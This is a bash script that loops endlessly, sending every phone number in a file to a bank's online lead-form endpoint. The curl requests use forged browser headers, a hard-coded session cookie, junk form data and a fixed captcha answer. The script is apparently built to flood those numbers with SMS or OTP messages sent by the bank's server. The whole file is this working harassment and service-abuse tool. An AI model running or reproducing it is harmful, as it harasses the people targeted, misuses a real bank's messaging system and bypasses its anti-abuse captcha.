while :
do

while read -r line; 
do 

curl --silent --output /dev/null 'https://apps.ucoonline.in/Lead_App/send_message.jsp' \
  -H 'authority: apps.ucoonline.in' \
  -H 'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="90", "Google Chrome";v="90"' \
  -H 'accept: */*' \
  -H 'x-requested-with: XMLHttpRequest' \
  -H 'sec-ch-ua-mobile: ?1' \
  -H 'user-agent: Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36' \
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'origin: https://apps.ucoonline.in' \
  -H 'sec-fetch-site: same-origin' \
  -H 'sec-fetch-mode: cors' \
  -H 'sec-fetch-dest: empty' \
  -H 'referer: https://apps.ucoonline.in/Lead_App/lead_web.jsp' \
  -H 'accept-language: en-US,en;q=0.9' \
  -H 'cookie: JSESSIONID=9AF635F323A70A62FDE04FB64FD56F78.apps1' \
  --data-raw 'mob=&ref_no=&otpv=&appRefNo=&lgName=fdgefgdgg&lgAddress=dfgdsggfesdggg&lgPincode=695656&lgState=DL&lgDistrict=NORTH+DELHI&lgBranch=0313&lgMobileno='$line'&lgEmail=sundeshaakshays%40gmail.com&lgFacilities=CC&lgTentAmt=656556565&lgRemarks=efwfwfsafw&declare_check=on&captchaRefno=315904&captchaResult=71' \
  --compressed -w '%{http_code} -> ' & echo "$line"

done < number.txt

done